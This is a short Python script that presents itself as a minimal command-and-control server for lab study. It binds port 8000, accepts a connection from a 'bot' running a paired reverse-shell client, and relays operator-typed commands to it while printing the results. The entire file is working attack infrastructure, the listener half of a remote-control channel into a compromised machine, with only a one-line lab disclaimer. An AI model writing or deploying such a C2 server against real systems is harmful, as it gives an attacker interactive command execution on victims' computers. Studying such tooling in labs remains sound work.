#!/usr/bin/env python3
"""
Minimal C2 / command-and-control server (study/lab use only).
Binds a port, accepts one bot, sends commands and prints results.
Pairs with reverse_shell_client.py.
"""
from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR

server_port = 8000
srv = socket(AF_INET, SOCK_STREAM)
srv.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)   # allow immediate rebind on restart
srv.bind(('', server_port))                   # '' = all interfaces
srv.listen(1)
print("[*] C2 listening, awaiting bot...")

conn, addr = srv.accept()
print(f"[+] Bot connected from {addr}")
print(conn.recv(1024).decode())

command = ""
while command != "exit":
    command = input("C2> ")
    conn.send(command.encode())
    print(conn.recv(4096).decode())
conn.shutdown(2)
conn.close()
